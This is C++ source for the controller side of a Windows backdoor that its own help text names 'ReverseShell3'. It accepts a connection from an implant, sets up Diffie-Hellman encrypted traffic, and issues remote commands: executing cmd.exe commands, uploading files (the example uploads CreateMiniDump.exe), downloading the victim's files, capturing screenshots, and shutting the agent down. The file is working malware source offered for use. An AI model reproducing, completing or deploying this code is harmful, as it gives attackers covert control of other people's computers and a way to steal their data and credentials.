#include "Stager.h"

bool Stager::Listen(PCSTR port, PCSTR ip)
{
	connSocket = Socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);

	if (not connSocket.Create())
	{
		std::cerr << "Error at Create" << std::endl;
		return false;
	}

	std::cout << "[+] Server socket successfully created." << std::endl;

	if (not connSocket.Bind(port, ip))
	{
		std::cout << "Error at Bind" << std::endl;
		connSocket.Close();
		return false;
	}

	std::cout << "[+] Server binded successfully" << std::endl;

	auto connAttempt = connSocket.Accept();

	if (not connAttempt.has_value())
	{
		std::cout << "Error at Accept" << std::endl;
		connSocket.Close();
		return false;
	}

	auto [acceptedSocket, connIp, connPort] = connAttempt.value();

	clientConn = Connection(acceptedSocket, connIp, connPort);
	OnConnect(clientConn);


	return true;

}

bool Stager::ShutDown()
{

	if (not connSocket.Close())
	{
		std::cerr << "Error at ShutDown" << std::endl;
		return false;
	}

#pragma region temporary
	if (not (clientConn.GetClientSocket() == INVALID_SOCKET))
		if (not clientConn.Close())
		{
			std::cerr << "Error at ShutDown" << std::endl;
			return false;
		}
#pragma endregion Code specific to close a single connected client

	return true;
}

bool Stager::OnConnect(Connection newConnection)
{
    Packet packet;

    BCRYPT_ALG_HANDLE exchDH = NULL;
    BCRYPT_KEY_HANDLE keyPair = NULL;
    BCryptBufferDesc ParameterList = { 0 };
    BCryptBuffer BufferArray[2] = { 0 };
    std::vector<BYTE> pubBlob;
    std::vector<BYTE> serverPubBlob;
    std::vector<BYTE> clientHello(32);
    std::vector<BYTE> serverHello(32);
    std::vector<BYTE> seed(64);
    LPCWSTR Label = L"master secret";

    // generate server hello bytes
    auto optServerHello = EasyBCrypt::GenerateRandomBytes(32);
    if (auto out = std::get_if<EasyBCrypt::STATUS>(&optServerHello))
    {
        std::string err = std::move(*(*out));
        std::cerr << err << std::endl;
        return false;
    }

    serverHello = std::get<std::vector<BYTE>>(optServerHello);

    // receive clientHello
    if (not newConnection.RecvPacket(packet))
    {
        std::cerr << "Failed to receive clientHello packet. Error status: " << GetLastError() << std::endl;
        return false;
    }
    try
    {
        packet >> clientHello;
    }

    catch (const PacketException& e)
    {
        std::cout << e.what() << std::endl;
        return false;
    }
    
    // send serverHello
    packet.Clear();
    packet << serverHello;

    if (not newConnection.SendPacket(packet))
    {
        std::cerr << "Failed to send serverHello packet. Error status: " << GetLastError() << std::endl;
        return false;
    }

    seed.assign(clientHello.begin(), clientHello.end());
    seed.insert(seed.end(), serverHello.begin(), serverHello.end());

    // KDF parameters
    //specify secret to append
    BufferArray[0].BufferType = KDF_TLS_PRF_SEED;
    BufferArray[0].cbBuffer = seed.size();
    BufferArray[0].pvBuffer = (PVOID)&seed[0];

    //specify secret to prepend
    BufferArray[1].BufferType = KDF_TLS_PRF_LABEL;
    BufferArray[1].cbBuffer = (DWORD)((wcslen(Label) + 1) * sizeof(WCHAR));
    BufferArray[1].pvBuffer = (PVOID)Label;

    ParameterList.cBuffers = 2;
    ParameterList.pBuffers = BufferArray;
    ParameterList.ulVersion = BCRYPTBUFFER_VERSION;

    // create Diffie Hellman parameter blob
    std::shared_ptr<BYTE[]> paramBlob = EasyBCrypt::CreateDHParamBlob();

    // Generate keypair
    auto optServerPubBlob = EasyBCrypt::GenerateDHKeyPair(paramBlob, exchDH, keyPair);
    if (auto out = std::get_if<EasyBCrypt::STATUS>(&optServerPubBlob))
    {
        std::string err = *(*out);
        std::cout << err << std::endl;
        return false;
    }

    // receive the client pubBlob
    if (not newConnection.RecvPacket(packet))
    {
        std::cerr << "Failed to receive server pubBlob packet. Error status: " << GetLastError() << std::endl;
        return false;
    }

    // obtain the client pubBlob
    try
    {
        packet >> serverPubBlob;
    }

    catch (const PacketException& e)
    {
        std::cout << e.what() << std::endl;
        return false;
    }

    // send the server pubBlob
    pubBlob = std::get<std::vector<BYTE>>(optServerPubBlob);
    packet.Clear();
    packet << pubBlob;

    if (not newConnection.SendPacket(packet))
    {
        std::cerr << "Failed to send pubBlob packet. Error status: " << GetLastError() << std::endl;
        return false;
    }

    // Generate secret agreement
    auto optSecret = EasyBCrypt::GenerateDHSecret(exchDH, keyPair, serverPubBlob, BCRYPT_KDF_TLS_PRF, &ParameterList);
    if (auto out = std::get_if<EasyBCrypt::STATUS>(&optSecret))
    {
        std::string err = *(*out);
        std::cout << err << std::endl;
        return false;
    }

    // 48 bytes shared secret
    std::vector<BYTE> sharedSecret = std::get<std::vector<BYTE>>(optSecret);
    
    // initialize a cipher object
    std::vector<BYTE> key(sharedSecret.begin(), sharedSecret.begin() + 16);

    try
    {
        clientConn.Crypt = Crypter(key);

        if (not newConnection.RecvPacket(packet))
        {
            std::cerr << "Failed to receive a packet. Error status: " << GetLastError() << std::endl;
            return false;
        }

        clientConn.Crypt.DecryptPacket(packet);

        // recevie client current dir
        std::cout << "[+] Accepted new connection: [ ip: " << newConnection.GetIp() << ", port: " << newConnection.GetPort() << "]" << std::endl;
        std::cout << "[+] Current Directory: ";
        std::cout << packet.ExtractString() << std::endl;
    }

    catch (const CrypterException& e)
    {
        std::cout << e.what() << std::endl;
        return false;
    }

    catch (const PacketException& e)
    {
        std::cout << e.what() << std::endl;
        return false;
    }

    return true;
}


bool Stager::Logic(const std::string& cmd)
{
    CommandStructure cmdStrc = CommandParser(cmd);
    Packet packet(static_cast<PacketType>(cmdStrc.type));

    try
    {
        if (cmdStrc.type == CommandType::invalid)
        {
            std::cout << cmdStrc.err;
        }

        else if (cmdStrc.type == CommandType::agentdown)
        {

            clientConn.Crypt.EncryptPacket(packet);

            if (not clientConn.SendPacket(packet))
            {
                std::cerr << "Error at Send (ConnectionClose)." << std::endl;
                return false;
            }
        }

        else if (cmdStrc.type == CommandType::upload)
        {
            std::filesystem::path localpath(cmdStrc.local_path);
            std::filesystem::path remotepath(cmdStrc.remote_path);
            remotepath /= localpath.filename();

            // check if file exists locally
            if (std::filesystem::exists(localpath))
            {
                // send a packet with the remotepath and filesize
                uintmax_t filesize = std::filesystem::file_size(localpath);
                packet << remotepath.string() << filesize;
                clientConn.Crypt.EncryptPacket(packet);

                if (not clientConn.SendPacket(packet))
                {
                    std::cerr << "Error at Send." << std::endl;
                    return false;
                }

                // receive one packet to confirm the remote path validity
                if (not clientConn.RecvPacket(packet))
                {
                    std::cerr << "Error at RecvPacket" << std::endl;
                    return false;
                }

                clientConn.Crypt.DecryptPacket(packet);

                if (packet.GetPacketType() != PacketType::Invalid)
                {
                    if (not clientConn.SendFile(localpath.string(), filesize))
                    {
                        std::cerr << "Error at SendFile (upload)" << std::endl;
                        return false;
                    }
                }

                // if the remote path is invalid print out err msg
                else
                {
                    std::cout << ">> [!] The specified remote path is invalid." << std::endl;
                }
            }

            // if the file is not exist locally print out error msg
            else
            {
                std::cout << ">> [!] No such file or directory." << std::endl;
            }
        }

        else if (cmdStrc.type == CommandType::download)
        {
            if (std::filesystem::exists(cmdStrc.local_path) and std::filesystem::is_directory(cmdStrc.local_path))
            {
                packet << cmdStrc.remote_path;

                clientConn.Crypt.EncryptPacket(packet);

                // send packet with the file name which we want to receive
                if (not clientConn.SendPacket(packet))
                {
                    std::cerr << "Error at Send (download pcket)." << std::endl;
                    return false;
                }

                // receive one packet and check if there is an error regrading the file specified path
                if (not clientConn.RecvPacket(packet))
                {
                    std::cerr << "Error at Send (download pcket)." << std::endl;
                    return false;
                }

                clientConn.Crypt.DecryptPacket(packet);

                if (packet.GetPacketType() == PacketType::Invalid)
                {
                    std::cout << ">> [!] No such file or directory." << std::endl;
                    return true;
                }

                uint32_t bytesToRead;
                packet >> bytesToRead;

                std::filesystem::path localpath(cmdStrc.local_path);
                std::filesystem::path remotepath(cmdStrc.remote_path);
                localpath /= remotepath.filename();

                std::string path = localpath.string();
                if (not clientConn.RecvFile(path, bytesToRead))
                {
                    std::cerr << "Error at RecvFile" << std::endl;
                    return false;
                }
            }

            else
            {
                std::cout << ">> [!] Invalid local path." << std::endl;
            }

        }

        else if (cmdStrc.type == CommandType::screenshot)
        {
            std::string filename = "sc_XXXXXX";

            if (::_mktemp_s(const_cast<char*>(filename.c_str()), filename.size() + 1) != 0)
            {
                std::cerr << "Error at _mktemp_s." << std::endl;
                return false;
            }

            filename = filename + ".jpg";

            //std::filesystem::path fullpath(cmdStrc.local_path);
            //fullpath /= filename;

            clientConn.Crypt.EncryptPacket(packet);

            if (not clientConn.SendPacket(packet))
            {
                std::cerr << "Error at SendPacket (screenshot)." << std::endl;
                return false;
            }

            if (not clientConn.RecvPacket(packet))
            {
                std::cerr << "Error at RecvPacket (screenshot)." << std::endl;
                return false;
            }

            clientConn.Crypt.DecryptPacket(packet);

            std::string fileBuffer;
            packet >> fileBuffer;

            std::fstream file;
            file.open(filename, std::ios::out | std::ios::binary);

            if (not file.is_open())
            {
                std::cerr << "Error while trying to open the file." << std::endl;
                return false;
            }

            file.write(&fileBuffer[0], fileBuffer.size());
            file.close();
        }

        else
        {
            if (cmdStrc.type == CommandType::changedir)
            {
                packet << cmdStrc.remote_path;
            }

            else
            {
                packet << cmdStrc.cmd;
            }

            clientConn.Crypt.EncryptPacket(packet);

            if (not clientConn.SendPacket(packet))
            {
                std::cerr << "Error at SendPacket (commandline)." << std::endl;
                return false;
            }

            if (not clientConn.RecvPacket(packet))
            {
                std::cerr << "Error at RecvPacket (commandline)" << std::endl;
                return false;
            }

            clientConn.Crypt.DecryptPacket(packet);

            std::cout << packet.ExtractString() + "\n";
        }
    }

    catch (const CrypterException& e)
    {
        std::cout << e.what() << std::endl;
        return false;
    }

    catch (const PacketException& e)
    {
        std::cout << e.what() << std::endl;
        return false;
    }

    return true;
}


// need to fix the help menu
void Stager::PrintHelp()
{
    std::cout << "[+] ReverseShell3 Backdoor" << std::endl;
    std::cout << "    ReverseShell3 is a simple windows backdoor over TCP connection, which implements the following functionality:" << std::endl;
    std::cout << std::endl;
    std::cout << "    * Execute command." << std::endl;
    std::cout << "    * Upload command." << std::endl;
    std::cout << "    * Download command." << std::endl;
    std::cout << "    * Screenshot command." << std::endl;
    std::cout << "    * Agentdown command." << std::endl;
    std::cout << std::endl;
    std::cout << "    Execute command - executes command via cmd.exe /c." << std::endl;;
    std::cout << std::endl;
	std::cout << "    Upload command - upload a file to a remote computer." << std::endl;
	std::cout << "    To use the upload command it is required to specify the --upload keyword following by the local path of the file following by the target path at the remote computer." << std::endl;
	std::cout << "    Example: --upload --localpath CreateMiniDump.exe --remotepath C:\\Users\\MyUserNAme\\AppData\\Local\\Temp" << std::endl;
    std::cout << std::endl;
	std::cout << "    Download command - download a file from a remote client." << std::endl;
	std::cout << "    To use the download command it is required to specify the --download keyword following by the remotepath of the file following by the download folder." << std::endl;
	std::cout << "    Example: --download --remotepath C:\\Users\\MyUserNAme\\AppData\\Local\\Temp --localpath ." << std::endl;
    std::cout << std::endl;
	std::cout << "    Screenshot command - capture a screenshot and download the image from a remote computer." << std::endl;
	std::cout << "    To use the screenshot command it is required to specify the --screenshot keyword." << std::endl;
    std::cout << std::endl;
	std::cout << "    Agentdown command - terminate the remote client." << std::endl;
	std::cout << "    To use the agentdown command it is required to specify the --agentdown keyword." << std::endl;
    std::cout << std::endl;
}

CommandStructure Stager::CommandParser(const std::string& input)
{
    CommandStructure commandStrc;
    std::string_view command;
    size_t spaceIndex = input.find(" ");

    if (spaceIndex != std::string::npos)
        command = std::string_view(input.c_str() + input.find(' ') + 1);

    if (input.starts_with("--agentdown") or input.starts_with("--ag"))
        commandStrc.type = CommandType::agentdown;

    else if (input.starts_with("--upload") or input.starts_with("--u"))
    {
        commandStrc.type = CommandType::upload;
        std::string_view localpath(command.data() + command.find(" ") + 1);

        if (command.starts_with("--localpath"))
        {
            commandStrc.local_path = localpath.substr(0, localpath.find(" "));
            std::string_view remotepath(localpath.data() + localpath.find(" ") + 1);
            if (remotepath.starts_with("--remotepath"))
            {
                commandStrc.remote_path = remotepath.substr(remotepath.find(" ") + 1);
            }
            else
            {
                commandStrc.type = CommandType::invalid;
                commandStrc.err = "[-] Please provide remotepath.\n[-] Invalid Command.\n";
                return commandStrc;
            }
        }

        else
        {
            commandStrc.type = CommandType::invalid;
            commandStrc.err = "[-] Please provide localpath.\n[-] Invalid Command.\n";
            return commandStrc;
        }
    }

    else if (input.starts_with("--download") or input.starts_with("--d"))
    {
        commandStrc.type = CommandType::download;
        std::string_view remotepath(command.data() + command.find(" ") + 1);

        if (command.starts_with("--remotepath"))
        {
            commandStrc.remote_path = remotepath.substr(0, remotepath.find(" "));
            std::string_view localpath(remotepath.data() + remotepath.find(" ") + 1);
            if (localpath.starts_with("--localpath"))
            {
                commandStrc.local_path = localpath.substr(localpath.find(" ") + 1);
            }
            else
            {
                commandStrc.type = CommandType::invalid;
                commandStrc.err = "[-] Please provide localpath.\n[-] Invalid Command.\n";
                return commandStrc;
            }
        }

        else
        {
            commandStrc.type = CommandType::invalid;
            commandStrc.err = "[-] Please provide remotepath.\n[-] Invalid Command.\n";
            return commandStrc;
        }
    }

    else if (input.starts_with("--screenshot") or input.starts_with("--cs"))
    {
        commandStrc.type = CommandType::screenshot;
        //std::string_view localpath(command.data() + command.find(" ") + 1);
        //if (localpath.starts_with("--localpath"))
        //{
        //    commandStrc.local_path = localpath.substr(localpath.find(" ") + 1);
        //}

        //else
        //{
        //    commandStrc.type = CommandType::invalid;
        //    commandStrc.err = "[-] Please provide localpath.\n[-] Invalid Command.\n";
        //    return commandStrc;
        //}
    }

    else
    {
        if (input.starts_with("cd "))
        {
            commandStrc.type = CommandType::changedir;
            commandStrc.remote_path = command;
            return commandStrc;
        }

        commandStrc.type = CommandType::commandline;
        commandStrc.cmd = input;
    }

    return commandStrc;
}
